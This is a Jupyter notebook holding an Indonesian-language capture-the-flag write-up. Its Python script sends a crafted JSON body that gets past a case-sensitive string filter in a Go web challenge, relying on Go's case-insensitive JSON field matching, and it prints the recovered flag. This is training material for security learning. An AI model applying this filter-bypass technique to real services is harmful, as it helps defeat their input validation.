{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "that_point\n",
      "Congrats! Here is the flag: asdasdasd\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "# URL = \"https://point.mc.ax/\"\n",
    "URL = \"http://localhost:8081\"\n",
    "\n",
    "bypass1 = \"What_point\"\n",
    "bypass2 = \"that_point\"\n",
    "bypassjson = {bypass1: bypass2}\n",
    "req = requests.post(url=URL, json=bypassjson)\n",
    "\n",
    "print(req.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Jadi dalam membuat script diatas, ada beberapa element if statement, yang kita perhatikan dalam source codenya.\n",
    "\n",
    "Yang pertama yaitu:\n",
    "```go\n",
    "...snip...\n",
    "if strings.Contains(string(body), \"what_point\") || strings.Contains(string(body), \"\\\\\") {\n",
    "    fmt.Fprintf(w, string(body))\n",
    "\tfmt.Fprintf(w, \"bypass 1\")\n",
    "\treturn\n",
    "}\n",
    "...snip...\n",
    "```\n",
    "\n",
    ">Note: kode programnya saya rubah sedikit, untuk keperluan debuging\n",
    "\n",
    "Bisa dilihat bahwa `if statement` ini menggunakan fungsi `strings.Contains`, dimana fungsi ini Case Sensitive, kita bisa mebypassnya menggunakan huruf besar, contoh:\n",
    "\n",
    "```python\n",
    "bypass1 = \"What_point\"\n",
    "```\n",
    "\n",
    "Yang kedua:\n",
    "```go\n",
    "..snip...\n",
    "\t\t\tvar whatpoint importantStuff\n",
    "\t\t\terr = json.Unmarshal(body, &whatpoint)\n",
    "\t\t\tif err != nil {\n",
    "\t\t\t\tfmt.Fprintf(w, \"error 2 not json format\")\n",
    "\t\t\t\treturn\n",
    "\t\t\t}\n",
    "...snip...\n",
    "```\n",
    "Kita lihat di fungsi `json.Unmarshal` yang akan error, jika request body yang kita kirimkan tidak berbentuk json.\n",
    "\n",
    "Setelah diatasnya ada variable yang menggunakan custom type struct:\n",
    "\n",
    "```go\n",
    "...snip...\n",
    "type importantStuff struct {\n",
    "\tWhatpoint string `json:\"what_point\"`\n",
    "}\n",
    "...snip...\n",
    "```\n",
    "\n",
    "Dimana struct ini berisi variable `Whatpoint` yang didalamnya berisi field tag `json:\"what_point\"`. Yess, mungkin ini yang kita cari untuk membypasss `if statement` selanjutnya.\n",
    "\n",
    "Yang ketiga:\n",
    "\n",
    "```go\n",
    "...snip...\n",
    "\t\t\tif whatpoint.Whatpoint == \"that_point\" {\n",
    "\t\t\t\tfmt.Fprintf(w, \"Congrats! Here is the flag: %s\", flag)\n",
    "\t\t\t\treturn\n",
    "\t\t\t} else {\n",
    "\t\t\t\tfmt.Fprintf(w, string(body))\n",
    "\t\t\t\tfmt.Fprintf(w, \"bypass 2 error\")\n",
    "\t\t\t\treturn\n",
    "\t\t\t}\n",
    "...snip...\n",
    "```\n",
    "\n",
    "Jadi karna disini kita sudah tau bahwa variable `whatpoint` memiliki field tag `json:\"what_point\"`, disini kita hanya perlu memberikan http request body yang berisikan format json seperti ini:\n",
    "\n",
    "```json\n",
    "{\n",
    "\t\"what_point\":\"that_point\"\n",
    "}\n",
    "```\n",
    "karna perlu bypass untuk `if statement` pertama tadi, kita ubah json-nya menjadi:\n",
    "```json\n",
    "\n",
    "{\n",
    "\t\"What_point\":\"that_point\"\n",
    "}\n",
    "```\n",
    "\n",
    "Matap, kita mendapatkan flagnya: `Congrats! Here is the flag: hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}`"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
